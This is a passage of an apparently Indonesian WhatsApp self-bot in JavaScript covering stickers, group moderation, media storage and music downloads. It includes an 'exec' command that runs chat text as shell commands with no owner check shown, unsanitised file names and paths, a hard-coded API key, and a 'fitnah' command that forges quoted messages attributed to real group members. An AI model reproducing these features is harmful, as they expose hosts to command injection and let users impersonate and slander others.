							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
						const media = await Repor.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						Repor.sendMessage(from, mess.wait, text,{quoted : revz})
						keyrmbg = 'C5ZeygbiedTZixDJJrm663Az'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Yah error dek')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								Repor.sendMessage(from, buff, sticker, {quoted: revz})
							})
						    })					
					} else {
						reply(`𝗸𝗶𝗿𝗶𝗺 𝗴𝗮𝗺𝗯𝗮𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix}𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗮𝘁𝗮𝘂 𝗿𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝗴𝗮𝗺𝗯𝗮𝗿`)
					}
					break
					
					case prefix+ 'gs':
					
					if ((isMedia && revz.message.videoMessage.seconds < 20 || isQuotedVideo && revz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 20) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
						const media = await Repor.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						Repor.sendMessage(from, mess.wait, text,{quoted : ftoko})
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Yah error dek`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								Repor.sendMessage(from, buff, sticker, {quoted: ftoko})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran) 
							}
							break
							
					case prefix+ 'toimg':
					
					if (!isQuotedSticker) return reply(' reply stickernya gan')
					encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran= getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
						buffer = fs.readFileSync(ran)
						Repor.sendMessage(from, buffer, image, {quoted: revz, caption: 'Nih Kack' })
						fs.unlinkSync(ran)
					})
					
					break 
					case prefix+ 'runtime':
uptime = process.uptime()
const timestampi = speed();
const latensip = speed() - timestampi
			             anjink =`◪ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲
*Aktif Sejak :*
\`\`\`${kyun(uptime)}\`\`\`
*Speed :*
\`\`\`${latensip.toFixed(4)} Second\`\`\`
`
			             Repor.sendMessage(from, anjink, text,{quoted : revz})
			           break
			           case prefix+ 'ping':
			          uptime = process.uptime()
					  const chatsIds = await Repor.chats.all()
                const timestamp = speed();
                const latensi = speed() - timestamp 
                p0 =` \`\`\`Loaded Message\`\`\`
                
\`\`\` - [ ${totalchat.length} ]  Total Chat\`\`\`
\`\`\` - [ Oppo ] HANDPHONE\`\`\`
\`\`\` - [ ${Repor.user.phone.wa_version} ] WA Version\`\`\`
\`\`\` - [ Baileys ] Server\`\`\`
\`\`\` - [ SELF ] MODE\`\`\`
\`\`\` - [ ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / 2024 ] RAM\`\`\`

_Aktif Sejak :_
\`\`\`${kyun(uptime)}\`\`\`
_Speed :_
\`\`\`${latensi.toFixed(4)} Second\`\`\``
                Repor.sendMessage(from, p0, text, { quoted: tys})
                    break
			           case prefix+ 'term': 
case prefix+ 'exec':
const cmyd = body.slice(6)
var itsme = `0@s.whatsapp.net`
var split = `*EXECUTOR SELF BOT*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(cmyd, (err, stdout) => {
if (err) return Repor.sendMessage(from, ` ${err}`, text, { quoted: revz })
if (stdout) {
Repor.sendMessage(from, stdout, text, term)
}
})
break
        case prefix+ 'attp':
        
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} MrA43G`)
                    teks = args.join(" ")
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/attp?apikey=${LolKey}&text=${teks}`)
                    Repor.sendMessage(from, buffer, sticker, { quoted: revz})
                    break
                    case prefix+ 'ttp':
                case prefix+ 'ttp2':
                case prefix+ 'ttp3':
                case prefix+ 'ttp4':
                case prefix+ 'attp':
                
                    if (args.length == 0) return reply(`Example: ${prefix + command} RevzGanz`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${LolKey}&text=${ini_txt}`)
                    Repor.sendMessage(from, ini_buffer, sticker, { quoted: revz})
                    break

					  //********** Funny COMMAND **********//
					  
					  case prefix+ 'kontak':
					  
                        entah = args[0]
                        disname = args[1]
                        if (isNaN(entah)) return reply('Invalid phone number'.toUpperCase());
                        vcard = 'BEGIN:VCARD\n'
                                  + 'VERSION:3.0\n'
                                  + `FN:${disname}\n`
                                  + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
                                  + 'END:VCARD'.trim()
                            Repor.sendMessage(from, {displayName: disname, vcard: vcard}, contact)
                            break
                            
			     case prefix+ 'kontag':
			     
					var bv = body.slice(8)
					var jl = `${bv}`
					if (args[0] === '') {
					var jl = `*CONTACT TAG*`
					}
					var group = await Repor.groupMetadata(from)
					   var member = group['participants']
					   var mem = []
					   member.map(async adm => {
					   mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					   })
					const vcardtag = 'BEGIN:VCARD\n'
					            + 'VERSION:3.0\n'
					            + `FN:${body.slice(8)}\n`
					            + 'ORG:ORANG STRESS;\n'
					            + `TEL;type=CELL;type=VOICE;waid=${Repor.user.jid.split('@')[0]}:${Repor.user.jid.split('@')[0]}\n`
					            + 'END:VCARD'
            				Repor.sendMessage(from, {displayname: mem, vcard: vcardtag}, MessageType.contact, { quoted: revz, contextInfo: {mentionedJid: mem}, quoted: {
					key: {
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
					},
					message: {
						"imageMessage": {
							"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
							"mimetype": "image/jpeg",
							"caption": jl,
							"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
							"fileLength": "28777",
							"height": 1080,
							"width": 1079,
							"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
							"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
							"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
							"mediaKeyTimestamp": "1610993486",
							"jpegThumbnail": fs.readFileSync('./media/fakenya.jpeg'),
							"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
							}
							}
							}
							})
        break
        
        case prefix+ 'hidetag':
        
					if (!isGroup) return reply(mess.only.group)
					var value = body.slice(8)
					var group = await Repor.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: revz
					}
					Repor.sendMessage(from, options, text,{quoted : tag})
					break
					
					  
					
			           case prefix+ 'stctag':
			           
                                        if (!isQuotedSticker) return reply('Ini sticker?')
                                        boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                                        delb = await Repor.downloadMediaMessage(boij)
                                        await fs.writeFileSync(`stctagg.webp`, delb)
                                        var group = await Repor.groupMetadata(from)
                                        var member = group['participants']
                                        var mem = []
                                        member.map(async adm => {
                                                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                                        })
					var itsme = `0@s.whatsapp.net`
					var split = `${body.slice(8)}`
					var selepbot = {
						contextInfo: {
							mentionedJid: mem,
                                                        participant: itsme,                                                                                                                          quotedMessage: {
                                                                extendedTextMessage: {
                                                                text: split,
							   }
					      	      }
					       }
					}
					result = fs.readFileSync(`stctagg.webp`)
                                        Repor.sendMessage(from, result, sticker, selepbot)
					await fs.unlinkSync(`stctagg.webp`)
					break
					
				case prefix+ 'totag':
				
		            if ((isMedia && !revz.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
		            file = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await Repor.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: tag
		            }
		            ini_buffer = fs.readFileSync(file)
		            Repor.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
		            file = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await Repor.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: tag
		            }
		            ini_buffer = fs.readFileSync(file)
		            Repor.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !revz.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
		            file = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await Repor.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: tag
		            }
		            ini_buffer = fs.readFileSync(file)
		            Repor.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !revz.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
		            file = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await Repor.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: tag
		            }
		            ini_buffer = fs.readFileSync(file)
		            Repor.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		        
            case prefix+ 'owner':
            case prefix+ 'developer':
            case prefix+ 'author':
                Repor.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: revz})
                    .then((res) => Repor.sendMessage(from, 'Ini Kak Kontak Boss Saya😇', text, {quoted: res}))
                break
                 
 
        
    			  //********** ONLY GROUP **********//
    			  
    			  

    			  case prefix+ 'fitnah':
		            if (args.length < 1) return fakevn(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            Repor.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		            
        case prefix+ 'linkgroup':
				case prefix+ 'linkgrup':
				case prefix+ 'linkgc':
				    if (!isGroup) return reply(mess.only.group)
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await Repor.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    Repor.sendMessage(from, yeh, text, {quoted: revz})
			        break
			        
        case prefix+ 'grup':
					case prefix+ 'gc':
					case prefix+ 'group':
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply('Lo Siapa Kontol')
					if (args[0] === 'buka') {
					    reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
						Repor.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
						Repor.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break
					
					case prefix+ 'chatlist':
				case prefix+ 'cekchat':
					Repor.updatePresence(from, Presence.composing)
					Repor.sendMessage(from, `Total : ${totalchat.length} Chat`, text, {quoted  : tys})
					break
					
					case prefix+ 'demote':
			      case prefix+ 'dm' : 
			    if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (revz.message.extendedTextMessage === undefined || revz.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
					mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, anda tidak menjadi admin :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						Repor.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
						Repor.groupDemoteAdmin(from, mentioned)
					}
					break
					
				case prefix+ 'listadmins':
				case prefix+ 'listadmin':
				case prefix+ 'adminlist':
				case prefix+ 'adminslist':
				
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
					
					case prefix+ 'promote':
				case prefix+ 'pm':
				
					if (!isGroup) return reply(mess.only.group)
					if(!isOwner && !revz.key.fromMe) return reply('_Lu Siapa?_')
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (revz.message.extendedTextMessage === undefined || revz.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
					mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, anda menjdi admin :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						Repor.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
						Repor.groupMakeAdmin(from, mentioned)
					}
					break
					
					case prefix+ 'welcome':
					
if (!isGroup) return fakestatus(mess.only.group)
if (args.length < 1) return fakestatus('Hmmmm')
if (Number(args[0]) === 1) {
if (isWelkom) return fakestatus('Udah Aktif lord')
welkom.push(from)
fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
return fakestatus('Sukses mengaktifkan fitur welcome di group ini ✔️')
} else if (Number(args[0]) === 0) {
welkom.splice(from, 1)
fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
return fakestatus('Sukses menonaktifkan fitur welcome di group ini ✔️')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
                    case prefix+ 'autosticker':
                    
					if (args.length < 1) return reply(`Penggunaan:\n\n${prefix}autosticker 1\natau\n${prefix}autosticker 0`)
					if (Number(args[0]) === 1) {
						if (isAuto) return reply('Udah aktif um')
						autosticker.push(from)
						fs.writeFileSync('./src/autosticker.json', JSON.stringify(autosticker))
						sendFakeStatus(from, `Sukses`, ftoko)
					} else if (Number(args[0]) === 0) {
						autosticker.splice(from)
						fs.writeFileSync('./src/autosticker.json', JSON.stringify(autosticker))
						reply(from, `Sukses`, fakestatus)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break
                    
					case prefix+ 'add':
					
					if(!isOwner && !revz.key.fromMe) return reply('_Lu Siapa?_')
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						Repor.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					
			    case prefix+ 'kick':
			    
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Usage ${prefix}kick nomor|tag`)
				if (revz.message.extendedTextMessage != undefined){
                    mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						Repor.groupRemove(from, mentioned[i])
                    }
                    Repor.sendMessage(from, 'Mampos Ke Kick', text, {quoted: troli})
                } else {
                    Repor.groupRemove(from, args[0] + '@s.whatsapp.net')
                    Repor.sendMessage(from, 'bye', text, {quoted:troli})
                }
				break
					
										case prefix+ 'online':
										  case prefix+ 'listonline':
										  
                if (!isGroup) return reply(`Only group`)
                let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                let online = [...Object.keys(Repor.chats.get(ido).presences), Repor.user.jid]
                Repor.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                    quoted: revz,
                    contextInfo: { mentionedJid: online }
                })
                break
                
                case prefix+ 'infoall':
                
                if(!isOwner && !revz.key.fromMe) return reply('_Lu Siapa?_')
					if (!isGroup) return reply(mess.only.group)
					var nom = revz.participant
					members_id = []
					teks = '\n'
					for (let mem of groupMembers) {
						teks += `┣❥   @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(`*From :* - [ 𝙎𝙀𝙇𝙁 𝘽𝙊𝙏 ] -\n*Info :*  ${body.slice(9)}\n*Total Member :* ${groupMembers.length} \n\n┏━━━⟪ *INFORMATION* ⟫━━━┓`+teks+'╚═ *「 Z A M  B O T 」* ', members_id, true)
					break
					
					case prefix+ 'edotensei':
					  case prefix+ 'edotense':
					  
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (revz.message.extendedTextMessage === undefined || revz.message.extendedTextMessage === null) return reply('Tag target yang ingin di edotense!')
					mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, edotense :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						Repor.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah di terima, edotense : @${mentioned[0].split('@')[0]}`, mentioned, true)
						Repor.groupRemove(from, mentioned)
					}
					break
					
					case prefix+ 'notif':
					
if (!isGroup) return reply(mess.only.group)
teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
group = await Repor.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: revz
}
await Repor.sendMessage(from, options, text)
break

      case prefix+ 'leave': 
				    if (!isGroup) return reply(mess.only.group)
			    	anu = await Repor.groupLeave(from, `Bye All Member *${groupMetadata.subject}*`, groupId)
	                break



				
					  //********** STORAGE **********//
case prefix+ 'addstik':

				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
				Repor.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: revz })
				break
				
case prefix+ 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				Repor.sendMessage(from, result, sticker,{quoted:revz})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
			
			case prefix+ 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				Repor.sendMessage(from, teks.trim(), extendedText, { quoted: revz, contextInfo: { "mentionedJid": setiker } })
				break
				
				case prefix+ 'addimg':
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				Repor.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: revz })
				break

			case prefix+ 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				Repor.sendMessage(from, buffer, image, { quoted: revz, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				case prefix+ 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				Repor.sendMessage(from, teks.trim(), extendedText, { quoted: revz, contextInfo: { "mentionedJid": setiker } })
				break
				case prefix+ 'addvid':
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				Repor.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: revz })
				break
case prefix+ 'listvid':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				Repor.sendMessage(from, teks.trim(), extendedText, { quoted: revz, contextInfo: { "mentionedJid": imagenye } })
				break
			case prefix+ 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				Repor.sendMessage(from, buffer, video, { quoted: revz, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				case prefix+ 'addvn':
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				Repor.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: revz })
				break
case prefix+ 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				Repor.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: revz, ptt: true })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				case prefix+ 'listvn':
			case prefix+ 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				Repor.sendMessage(from, teks.trim(), extendedText, { quoted: revz, contextInfo: { "mentionedJid": audionye } })
				break
				//********** DOWNLOAD **********//
				
			
case prefix+ 'playvideo':   
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... Proses Dibutuhkan Waktu Beberapa Menit')
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=apivinz`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				Repor.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:fvideo, caption: 'Nih Gan'})
					break  
					
					case prefix+ 'play':
case prefix+ 'playaudio':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
Repor.sendMessage(from, 'Tunggu Sebentar🤡' , text, {quoted:fakestatus})
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`Sedang Memutar Lagu  ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: ftoko, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: revz, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: revz, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: revz, mimetype: 'audio/mp3', filename: res[0].output})
}
break
		   
                case prefix+ 'ytsearch':
			
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytsearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
